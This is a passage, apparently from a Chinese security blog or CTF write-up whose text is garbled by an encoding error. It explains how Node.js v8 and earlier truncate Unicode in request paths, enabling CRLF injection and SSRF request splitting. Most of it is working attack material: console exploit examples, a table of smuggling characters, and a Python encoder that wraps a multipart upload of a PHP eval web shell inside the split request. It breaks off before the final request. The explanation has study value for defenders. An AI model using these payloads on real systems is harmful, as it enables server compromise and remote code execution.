<h3 id="HTTP-è¯·æ±‚è·¯å¾„ä¸­çš„-Unicode-å­—ç¬¦æŸå"><a href="#HTTP-è¯·æ±‚è·¯å¾„ä¸­çš„-Unicode-å­—ç¬¦æŸå" class="headerlink" title="HTTP è¯·æ±‚è·¯å¾„ä¸­çš„ Unicode å­—ç¬¦æŸå"></a>HTTP è¯·æ±‚è·¯å¾„ä¸­çš„ Unicode å­—ç¬¦æŸå</h3><p>è™½ç„¶ç”¨æˆ·å‘å‡ºçš„ HTTP è¯·æ±‚é€šå¸¸å°†è¯·æ±‚è·¯å¾„æŒ‡å®šä¸ºå­—ç¬¦ä¸²ï¼Œä½†Node.jsæœ€ç»ˆå¿…é¡»å°†è¯·æ±‚ä½œä¸ºåŸå§‹å­—èŠ‚è¾“å‡ºã€‚JavaScriptæ”¯æŒunicodeå­—ç¬¦ä¸²ï¼Œå› æ­¤å°†å®ƒä»¬è½¬æ¢ä¸ºå­—èŠ‚æ„å‘³ç€é€‰æ‹©å¹¶åº”ç”¨é€‚å½“çš„Unicodeç¼–ç ã€‚å¯¹äºä¸åŒ…å«ä¸»ä½“çš„è¯·æ±‚ï¼ŒNode.jsé»˜è®¤ä½¿ç”¨â€œlatin1â€ï¼Œè¿™æ˜¯ä¸€ç§å•å­—èŠ‚ç¼–ç å­—ç¬¦é›†ï¼Œä¸èƒ½è¡¨ç¤ºé«˜ç¼–å·çš„Unicodeå­—ç¬¦ï¼Œä¾‹å¦‚ğŸ¶è¿™ä¸ªè¡¨æƒ…ã€‚æ‰€ä»¥ï¼Œå½“æˆ‘ä»¬çš„è¯·æ±‚è·¯å¾„ä¸­å«æœ‰å¤šå­—èŠ‚ç¼–ç çš„Unicodeå­—ç¬¦æ—¶ï¼Œä¼šè¢«æˆªæ–­å–æœ€ä½å­—èŠ‚ï¼Œæ¯”å¦‚ <code>\u0130</code> å°±ä¼šè¢«æˆªæ–­ä¸º <code>\u30</code>ï¼š</p>
<p><img src="https://p3.ssl.qhimg.com/t01005ff8722a4037e0.png" alt="img"></p>
<h3 id="Unicode-å­—ç¬¦æŸåé€ æˆçš„-HTTP-æ‹†åˆ†æ”»å‡»"><a href="#Unicode-å­—ç¬¦æŸåé€ æˆçš„-HTTP-æ‹†åˆ†æ”»å‡»" class="headerlink" title="Unicode å­—ç¬¦æŸåé€ æˆçš„ HTTP æ‹†åˆ†æ”»å‡»"></a>Unicode å­—ç¬¦æŸåé€ æˆçš„ HTTP æ‹†åˆ†æ”»å‡»</h3><p>åˆšæ‰æ¼”ç¤ºçš„é‚£ä¸ª HTTP è¯·æ±‚è·¯å¾„ä¸­çš„ Unicode å­—ç¬¦æŸåçœ‹ä¼¼æ²¡æœ‰ä»€ä¹ˆç”¨å¤„ï¼Œä½†å®ƒå¯ä»¥åœ¨ nodejs çš„ HTTP æ‹†åˆ†æ”»å‡»ä¸­å¤§æ˜¾èº«æ‰‹ã€‚</p>
<p>ç”±äºnodejsçš„HTTPåº“åŒ…å«äº†é˜»æ­¢CRLFçš„æªæ–½ï¼Œå³å¦‚æœä½ å°è¯•å‘å‡ºä¸€ä¸ªURLè·¯å¾„ä¸­å«æœ‰å›è½¦ã€æ¢è¡Œæˆ–ç©ºæ ¼ç­‰æ§åˆ¶å­—ç¬¦çš„HTTPè¯·æ±‚æ˜¯ï¼Œå®ƒä»¬ä¼šè¢«URLç¼–ç ï¼Œæ‰€ä»¥æ­£å¸¸çš„CRLFæ³¨å…¥åœ¨nodejsä¸­å¹¶ä¸èƒ½åˆ©ç”¨ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&gt; <span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&quot;http&quot;</span>);</span><br><span class="line">&gt; http.<span class="title function_">get</span>(<span class="string">&#x27;http://47.101.57.72:4000/\r\n/WHOAMI&#x27;</span>).<span class="property">output</span></span><br><span class="line">[ <span class="string">&#x27;GET /%0D%0A/WHOAMI HTTP/1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#x27;</span> ]</span><br></pre></td></tr></table></figure>

<p><img src="https://p4.ssl.qhimg.com/t01911a74dee31030c4.png" alt="img"></p>
<p>ä½†ä¸å¹¸çš„æ˜¯ï¼Œä¸Šè¿°çš„å¤„ç†Unicodeå­—ç¬¦é”™è¯¯æ„å‘³ç€å¯ä»¥è§„é¿è¿™äº›ä¿æŠ¤æªæ–½ã€‚è€ƒè™‘å¦‚ä¸‹çš„URLï¼Œå…¶ä¸­åŒ…å«ä¸€äº›é«˜ç¼–å·çš„Unicodeå­—ç¬¦ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&gt; <span class="string">&#x27;http://47.101.57.72:4000/\u&#123;010D&#125;\u&#123;010A&#125;/WHOAMI&#x27;</span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//47.101.57.72:4000/ÄÄŠ/WHOAMI</span></span><br></pre></td></tr></table></figure>

<p>å½“ Node.js v8 æˆ–æ›´ä½ç‰ˆæœ¬å¯¹æ­¤URLå‘å‡º <code>GET</code> è¯·æ±‚æ—¶ï¼Œå®ƒä¸ä¼šè¿›è¡Œç¼–ç è½¬ä¹‰ï¼Œå› ä¸ºå®ƒä»¬ä¸æ˜¯HTTPæ§åˆ¶å­—ç¬¦ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&gt; http.<span class="title function_">get</span>(<span class="string">&#x27;http://47.101.57.72:4000/\u010D\u010A/WHOAMI&#x27;</span>).<span class="property">output</span></span><br><span class="line">[ <span class="string">&#x27;GET /ÄÄŠ/WHOAMI HTTP/1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#x27;</span> ]</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å½“ç»“æœå­—ç¬¦ä¸²è¢«ç¼–ç ä¸º latin1 å†™å…¥è·¯å¾„æ—¶ï¼Œè¿™äº›å­—ç¬¦å°†åˆ†åˆ«è¢«æˆªæ–­ä¸º â€œ\râ€ï¼ˆ%0dï¼‰å’Œ â€œ\nâ€ï¼ˆ%0aï¼‰ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&gt; <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;http://47.101.57.72:4000/\u&#123;010D&#125;\u&#123;010A&#125;/WHOAMI&#x27;</span>, <span class="string">&#x27;latin1&#x27;</span>).<span class="title function_">toString</span>()</span><br><span class="line"><span class="string">&#x27;http://47.101.57.72:4000/\r\n/WHOAMI&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://p4.ssl.qhimg.com/t01820e6d889f5f8892.png" alt="img"></p>
<p>å¯è§ï¼Œé€šè¿‡åœ¨è¯·æ±‚è·¯å¾„ä¸­åŒ…å«ç²¾å¿ƒé€‰æ‹©çš„Unicodeå­—ç¬¦ï¼Œæ”»å‡»è€…å¯ä»¥æ¬ºéª—Node.jså¹¶æˆåŠŸå®ç°CRLFæ³¨å…¥ã€‚</p>
<p>ä¸ä»…æ˜¯CRLFï¼Œæ‰€æœ‰çš„æ§åˆ¶å­—ç¬¦éƒ½å¯ä»¥é€šè¿‡è¿™ä¸ªæ„é€ å‡ºæ¥ã€‚ä¸‹é¢æ˜¯æˆ‘åˆ—ä¸¾å‡ºæ¥çš„è¡¨æ ¼ï¼Œç¬¬ä¸€åˆ—æ˜¯éœ€è¦æ„é€ çš„å­—ç¬¦ï¼Œç¬¬äºŒåˆ—æ˜¯å¯æ„é€ å‡ºç›¸åº”å­—ç¬¦çš„é«˜ç¼–å·çš„Unicodeç ï¼Œç¬¬ä¸‰åˆ—æ˜¯é«˜ç¼–å·çš„Unicodeç å¯¹åº”çš„å­—ç¬¦ï¼Œç¬¬å››åˆ—æ˜¯é«˜ç¼–å·çš„Unicodeç å¯¹åº”çš„å­—ç¬¦çš„URLç¼–ç ï¼š</p>
<table>
<thead>
<tr>
<th align="center">å­—ç¬¦</th>
<th align="center">å¯ç”±ä»¥ä¸‹Unicodeç¼–ç æ„é€ å‡º</th>
<th align="center">Unicodeç¼–ç å¯¹åº”çš„å­—ç¬¦</th>
<th align="center">Unicodeç¼–ç å¯¹åº”çš„å­—ç¬¦å¯¹åº”çš„URLç¼–ç </th>
</tr>
</thead>
<tbody><tr>
<td align="center">å›è½¦ç¬¦ \r</td>
<td align="center">\u010d</td>
<td align="center">Ä</td>
<td align="center">%C4%8D</td>
</tr>
<tr>
<td align="center">æ¢è¡Œç¬¦ \n</td>
<td align="center">\u010a</td>
<td align="center">ÄŠ</td>
<td align="center">%C4%8A</td>
</tr>
<tr>
<td align="center">ç©ºæ ¼</td>
<td align="center">\u0120</td>
<td align="center">Ä </td>
<td align="center">%C4%A0</td>
</tr>
<tr>
<td align="center">åæ–œæ  \</td>
<td align="center">\u0122</td>
<td align="center">Ä¢</td>
<td align="center">%C4%A2</td>
</tr>
<tr>
<td align="center">å•å¼•å· â€˜</td>
<td align="center">\u0127</td>
<td align="center">Ä§</td>
<td align="center">%C4%A7</td>
</tr>
<tr>
<td align="center">åå¼•å· &#96;</td>
<td align="center">\u0160</td>
<td align="center">Å </td>
<td align="center">%C5%A0</td>
</tr>
<tr>
<td align="center">å¹å· !</td>
<td align="center">\u0121</td>
<td align="center">Ä¡</td>
<td align="center">%C4%A1</td>
</tr>
</tbody></table>
<p>è¿™ä¸ªbugå·²ç»åœ¨Node.js10ä¸­è¢«ä¿®å¤ï¼Œå¦‚æœè¯·æ±‚è·¯å¾„åŒ…å«éAsciiå­—ç¬¦ï¼Œåˆ™ä¼šæŠ›å‡ºé”™è¯¯ã€‚ä½†æ˜¯å¯¹äº Node.js v8 æˆ–æ›´ä½ç‰ˆæœ¬ï¼Œå¦‚æœæœ‰ä¸‹åˆ—æƒ…å†µï¼Œä»»ä½•å‘å‡ºHTTPè¯·æ±‚çš„æœåŠ¡å™¨éƒ½å¯èƒ½å—åˆ°é€šè¿‡è¯·æ±‚æ‹†å®ç°çš„SSRFçš„æ”»å‡»ï¼š</p>
<ul>
<li>æ¥å—æ¥è‡ªç”¨æˆ·è¾“å…¥çš„Unicodeæ•°æ®</li>
<li>å¹¶å°†å…¶åŒ…å«åœ¨HTTPè¯·æ±‚çš„è·¯å¾„ä¸­</li>
<li>ä¸”è¯·æ±‚å…·æœ‰ä¸€ä¸ª0é•¿åº¦çš„ä¸»ä½“ï¼ˆæ¯”å¦‚ä¸€ä¸ª <code>GET</code> æˆ–è€… <code>DELETE</code>ï¼‰</li>
</ul>
<h3 id="åœ¨-HTTP-çŠ¶æ€è¡Œæ³¨å…¥æ¶æ„é¦–éƒ¨å­—æ®µ"><a href="#åœ¨-HTTP-çŠ¶æ€è¡Œæ³¨å…¥æ¶æ„é¦–éƒ¨å­—æ®µ" class="headerlink" title="åœ¨ HTTP çŠ¶æ€è¡Œæ³¨å…¥æ¶æ„é¦–éƒ¨å­—æ®µ"></a>åœ¨ HTTP çŠ¶æ€è¡Œæ³¨å…¥æ¶æ„é¦–éƒ¨å­—æ®µ</h3><p>ç”±äº NodeJS çš„è¿™ä¸ª CRLF æ³¨å…¥ç‚¹åœ¨ HTTP çŠ¶æ€è¡Œï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬è¦æ³¨å…¥æ¶æ„çš„ HTTP é¦–éƒ¨å­—æ®µçš„è¯è¿˜éœ€è¦é—­åˆçŠ¶æ€è¡Œä¸­ <code>HTTP/1.1</code> ï¼Œå³ä¿è¯æ³¨å…¥åæœ‰æ­£å¸¸çš„ HTTP çŠ¶æ€è¡Œï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&gt; http.<span class="title function_">get</span>(<span class="string">&#x27;http://47.101.57.72:4000/\u0120HTTP/1.1\u010D\u010ASet-Cookie:\u0120PHPSESSID=whoami&#x27;</span>).<span class="property">output</span></span><br><span class="line">[ <span class="string">&#x27;GET /Ä HTTP/1.1ÄÄŠSet-Cookie:Ä PHPSESSID=whoami HTTP/1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#x27;</span> ]</span><br></pre></td></tr></table></figure>

<p><img src="https://p4.ssl.qhimg.com/t01833dd0e566e383b1.png" alt="img"></p>
<p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒæˆåŠŸæ„é€ å‡ºäº†ä¸€ä¸ª Set-Cookie é¦–éƒ¨å­—æ®µï¼Œè™½ç„¶åé¢è¿˜æœ‰ä¸€ä¸ª <code>HTTP/1.1</code> ï¼Œä½†æˆ‘ä»¬æ ¹æ®è¯¥åŸç†ä¾ç„¶å¯ä»¥å°†å…¶é—­åˆï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&gt; http.<span class="title function_">get</span>(<span class="string">&#x27;http://47.101.57.72:4000/\u0120HTTP/1.1\u010D\u010ASet-Cookie:\u0120PHPSESSID=whoami\u010D\u010Atest:&#x27;</span>).<span class="property">output</span></span><br><span class="line">[ <span class="string">&#x27;GET /Ä HTTP/1.1ÄÄŠSet-Cookie:Ä PHPSESSID=whoamiÄÄŠtest: HTTP/1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#x27;</span> ]</span><br></pre></td></tr></table></figure>

<p><img src="https://p5.ssl.qhimg.com/t0196c013fcb593f5dc.png" alt="img"></p>
<p>è¿™æ ·ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥æ„é€  â€œä»»æ„â€ çš„HTTPè¯·æ±‚äº†ã€‚</p>
<h3 id="åœ¨-HTTP-çŠ¶æ€è¡Œæ³¨å…¥å®Œæ•´-HTTP-è¯·æ±‚"><a href="#åœ¨-HTTP-çŠ¶æ€è¡Œæ³¨å…¥å®Œæ•´-HTTP-è¯·æ±‚" class="headerlink" title="åœ¨ HTTP çŠ¶æ€è¡Œæ³¨å…¥å®Œæ•´ HTTP è¯·æ±‚"></a>åœ¨ HTTP çŠ¶æ€è¡Œæ³¨å…¥å®Œæ•´ HTTP è¯·æ±‚</h3><p>é¦–å…ˆï¼Œç”±äº NodeJS çš„è¿™ä¸ª CRLF æ³¨å…¥ç‚¹åœ¨ HTTP çŠ¶æ€è¡Œï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬è¦æ³¨å…¥å®Œæ•´çš„ HTTP è¯·æ±‚çš„è¯éœ€è¦å…ˆé—­åˆçŠ¶æ€è¡Œä¸­ <code>HTTP/1.1</code> ï¼Œå³ä¿è¯æ³¨å…¥åæœ‰æ­£å¸¸çš„ HTTP çŠ¶æ€è¡Œã€‚å…¶æ¬¡ä¸ºäº†ä¸è®©åŸæ¥çš„ <code>HTTP/1.1</code> å½±å“æˆ‘ä»¬æ–°æ„é€ çš„è¯·æ±‚ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å†æ„é€ ä¸€æ¬¡ <code>GET /</code> é—­åˆåŸæ¥çš„ HTTP è¯·æ±‚ã€‚</p>
<p>å‡è®¾ç›®æ ‡ä¸»æœºå­˜åœ¨SSRFï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç›®æ ‡ä¸»æœºæœ¬åœ°ä¸Šä¼ æ–‡ä»¶ã€‚æˆ‘ä»¬éœ€è¦å°è¯•æ„é€ å¦‚ä¸‹è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ çš„å®Œæ•´ POST è¯·æ±‚ï¼š</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>437</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=nk67astv61hqanskkddslkgst4</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;MAX_FILE_SIZE&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="number">100000</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;uploaded&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;whoami&quot;</span>]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;Upload&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">Upload</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span></span><br></pre></td></tr></table></figure>

<p>ä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬å°†è¿™ä¸ªPOSTè¯·æ±‚é‡Œé¢çš„æ‰€æœ‰çš„å­—ç¬¦åŒ…æ‹¬æ§åˆ¶ç¬¦å…¨éƒ¨ç”¨ä¸Šè¿°çš„é«˜ç¼–å·Unicodeç è¡¨ç¤ºï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /upload.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: 437</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">100000</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell.php&quot;</span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;Upload&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Upload</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET / HTTP/1.1</span></span><br><span class="line"><span class="string">test:&#x27;&#x27;&#x27;</span>.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload_encode</span>(<span class="params">raw</span>):</span><br><span class="line">    ret = <span class="string">u&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> raw:</span><br><span class="line">        ret += <span class="built_in">chr</span>(<span class="number">0x0100</span>+<span class="built_in">ord</span>(i))</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">payload = payload_encode(payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡º: Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÄÄŠÅÅÅ“Å”Ä Ä¯ÅµÅ°Å¬Å¯Å¡Å¤Ä®Å°Å¨Å°Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÅˆÅ¯Å³Å´ÄºÄ Ä±Ä²Ä·Ä®Ä°Ä®Ä°Ä®Ä±ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­ÅŒÅ¥Å®Å§Å´Å¨ÄºÄ Ä´Ä³Ä·ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å”Å¹Å°Å¥ÄºÄ Å­ÅµÅ¬Å´Å©Å°Å¡Å²Å´Ä¯Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å¢Å¯ÅµÅ®Å¤Å¡Å²Å¹Ä½Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅ•Å³Å¥Å²Ä­ÅÅ§Å¥Å®Å´ÄºÄ ÅÅ¯ÅºÅ©Å¬Å¬Å¡Ä¯ÄµÄ®Ä°Ä Ä¨Å—Å©Å®Å¤Å¯Å·Å³Ä ÅÅ”Ä Ä±Ä°Ä®Ä°Ä»Ä Å—Å©Å®Ä¶Ä´Ä»Ä Å¸Ä¶Ä´Ä©Ä ÅÅ°Å°Å¬Å¥Å—Å¥Å¢Å‹Å©Å´Ä¯ÄµÄ³Ä·Ä®Ä³Ä¶Ä Ä¨Å‹ÅˆÅ”ÅÅŒÄ¬Ä Å¬Å©Å«Å¥Ä Å‡Å¥Å£Å«Å¯Ä©Ä ÅƒÅ¨Å²Å¯Å­Å¥Ä¯Ä¹Ä°Ä®Ä°Ä®Ä´Ä´Ä³Ä°Ä®Ä·Ä²Ä Å“Å¡Å¦Å¡Å²Å©Ä¯ÄµÄ³Ä·Ä®Ä³Ä¶ÄÄŠÅÅ£Å£Å¥Å°Å´ÄºÄ Å´Å¥Å¸Å´Ä¯Å¨Å´Å­Å¬Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¸Å¨Å´Å­Å¬Ä«Å¸Å­Å¬Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¸Å­Å¬Ä»Å±Ä½Ä°Ä®Ä¹Ä¬Å©Å­Å¡Å§Å¥Ä¯Å¡Å¶Å©Å¦Ä¬Å©Å­Å¡Å§Å¥Ä¯Å·Å¥Å¢Å°Ä¬Å©Å­Å¡Å§Å¥Ä¯Å¡Å°Å®Å§Ä¬ÄªÄ¯ÄªÄ»Å±Ä½Ä°Ä®Ä¸Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å³Å©Å§Å®Å¥Å¤Ä­Å¥Å¸Å£Å¨Å¡Å®Å§Å¥Ä»Å¶Ä½Å¢Ä³Ä»Å±Ä½Ä°Ä®Ä¹ÄÄŠÅÅ£Å£Å¥Å°Å´Ä­Å…Å®Å£Å¯Å¤Å©Å®Å§ÄºÄ Å§ÅºÅ©Å°Ä¬Ä Å¤Å¥Å¦Å¬Å¡Å´Å¥ÄÄŠÅÅ£Å£Å¥Å°Å´Ä­ÅŒÅ¡Å®Å§ÅµÅ¡Å§Å¥ÄºÄ ÅºÅ¨Ä­ÅƒÅÄ¬ÅºÅ¨Ä»Å±Ä½Ä°Ä®Ä¹ÄÄŠÅƒÅ¯Å¯Å«Å©Å¥ÄºÄ ÅÅˆÅÅ“Å…Å“Å“Å‰Å„Ä½Å®Å«Ä¶Ä·Å¡Å³Å´Å¶Ä¶Ä±Å¨Å±Å¡Å®Å³Å«Å«Å¤Å¤Å³Å¬Å«Å§Å³Å´Ä´ÄÄŠÅƒÅ¯Å®Å®Å¥Å£Å´Å©Å¯Å®ÄºÄ Å£Å¬Å¯Å³Å¥ÄÄŠÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢ÅÅÅ˜ÅŸÅ†Å‰ÅŒÅ…ÅŸÅ“Å‰ÅšÅ…Ä¢ÄÄŠÄÄŠÄ±Ä°Ä°Ä°Ä°Ä°ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢ÅµÅ°Å¬Å¯Å¡Å¤Å¥Å¤Ä¢Ä»Ä Å¦Å©Å¬Å¥Å®Å¡Å­Å¥Ä½Ä¢Å³Å¨Å¥Å¬Å¬Ä®Å°Å¨Å°Ä¢ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å”Å¹Å°Å¥ÄºÄ Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¯Å£Å´Å¥Å´Ä­Å³Å´Å²Å¥Å¡Å­ÄÄŠÄÄŠÄ¼Ä¿Å°Å¨Å°Ä Å¥Å¶Å¡Å¬Ä¨Ä¤ÅŸÅÅÅ“Å”Å›Ä¢Å·Å¨Å¯Å¡Å­Å©Ä¢ÅÄ©Ä»Ä¿Ä¾ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢Å•Å°Å¬Å¯Å¡Å¤Ä¢ÄÄŠÄÄŠÅ•Å°Å¬Å¯Å¡Å¤ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶Ä­Ä­ÄÄŠÄÄŠÅ‡Å…Å”Ä Ä¯Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÅ´Å¥Å³Å´Äº</span></span><br></pre></td></tr></table></figure>

<p>æ„é€ è¯·æ±‚ï¼š</p>
